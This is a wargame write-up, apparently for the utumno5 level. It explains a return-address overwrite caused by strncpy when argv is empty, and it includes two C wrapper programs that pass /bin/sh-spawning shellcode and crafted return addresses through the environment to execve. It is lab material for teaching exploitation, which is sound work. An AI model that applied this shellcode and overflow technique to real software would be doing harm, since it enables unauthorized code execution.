Frankly... not sure what happened with this one.

The general premise -- and how I got the solve -- is that the utumno5 checks that argv is completely null...
and then it uses 'argv+0x28' as a parameter for a function named 'hihi'. This function uses strlen to see if argv+0x28 is greater in length, and uses
strncopy if it is, writing 14 bytes to a location in memory. If not, it uses strcpy...

What was weird to me, is I didn't even figure out or try to figure out how to get around the strn/strcpy, the strncpy automatically wrote bytes to the location of the
return address anyway...

This level (with the null argv component) reminded me quite a lot of utumno2 (also wanted a null argv, but loaded in a variable from argv+offset).

So I took the payload/wrapper program that I wrote for utumno2, and tried it out for this level.


				   u2wrapper.c
	┌─────────────────────────────────────────────────────────────┐
	│#include <unistd.h>                                          │
	│                                                             │
	│int main(void) {                                             │
	│	char *environment[19] = {"AAAA", "BBBB", "CCCC", "DDDD",  │
	│	"EEEE", "FFFF", "GGGG", "HHHH", "IIII",                   │
	│	"AAAABBBBCCCCDDDD\x9c\xdf\xff\xff", "KKKK", "LLLL",       │
	│	"MMMM", "NNNN", "OOOO", "PPPP", "WANTTOUSETHIS",          │
	│	"SHELLCODE=\x50\xd4\xff\xff\x31\xc0\x31\xdb\x31           │
	│	\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68      │
	│	\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b      │
	│	\x1c\x24\x89\xe1\xb0\x0b\xcd\x80", 0};                    │
	│	char *argv[2] = {"./utumno2", 0};                         │
	│	char *empty[] = {NULL};                                   │
	│	execve("/utumno/utumno2", empty, environment);            │
	│}                                                            │
	└─────────────────────────────────────────────────────────────┘

So in this case, the  env var 'AAAABBBBCCCCDDDD\x9c...' ended up getting loaded into the return address already, writing address 0xffffdf9c...

The only work to be done was altering the address to write (0xffffdfb6), and the level was solved.

				   u5wrapper.c
	┌─────────────────────────────────────────────────────────────┐
	│#include <unistd.h>                                          │
	│                                                             │
	│int main(void) {                                             │
	│	char *environment[19] = {"AAAA", "BBBB", "CCCC", "DDDD",  │
	│	"EEEE", "FFFF", "GGGG", "HHHH", "IIII",                   │
	│	"AAAAAAAAAAAAAAAA\xb6\xdf\xff\xff", "KKKK", "LLLL",       │
	│	"MMMM", "NNNN", "OOOO", "PPPP", "WANTTOUSETHIS",          │
	│	"SHELLCODE=\x50\xd4\xff\xff\x31\xc0\x31\xdb\x31           │
	│	\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68      │
	│	\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b      │
	│	\x1c\x24\x89\xe1\xb0\x0b\xcd\x80", 0};                    │
	│	char *argv[2] = {"./utumno2", 0};                         │
	│	char *empty[] = {NULL};                                   │
	│	execve("/utumno/utumno5", empty, environment);            │
	│}                                                            │
	└─────────────────────────────────────────────────────────────┘

That's the level!
